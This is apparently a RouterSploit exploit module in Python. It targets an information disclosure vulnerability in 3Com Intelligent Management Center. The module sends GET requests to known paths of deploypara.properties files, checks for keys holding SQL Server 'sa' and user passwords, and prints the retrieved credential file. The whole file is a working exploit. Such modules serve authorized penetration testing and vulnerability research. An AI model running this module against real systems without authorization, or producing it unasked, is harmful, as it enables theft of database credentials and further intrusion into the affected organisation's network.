from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "3Com IMC Info Disclosure",
        "description": "Exploits 3Com Intelligent Management Center information disclosure vulnerability that allows to fetch credentials for SQL sa account",
        "authors": (
            "Richard Brain",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/12680/",
        ),
        "devices": (
            "3Com Intelligent Management Center",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    def __init__(self):
        self.paths = [
            "/imc/reportscript/sqlserver/deploypara.properties",
            "/rpt/reportscript/sqlserver/deploypara.properties",
            "/imc/reportscript/oracle/deploypara.properties"
        ]

        self.valid = None

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            print_status("Sending request to download sensitive information")
            response = self.http_request(
                method="GET",
                path=self.valid,
            )

            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_status("Reading {}".format(self.valid))
                print_info(response.text)
            else:
                print_error("Exploit failed - could not retrieve response")

        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        for path in self.paths:
            response = self.http_request(
                method="GET",
                path=path,
            )
            if response is None:
                continue

            if any(map(lambda x: x in response.text, ["report.db.server.name", "report.db.server.sa.pass", "report.db.server.user.pass"])):
                self.valid = path
                return True  # target is vulnerable

        return False  # target not vulnerable
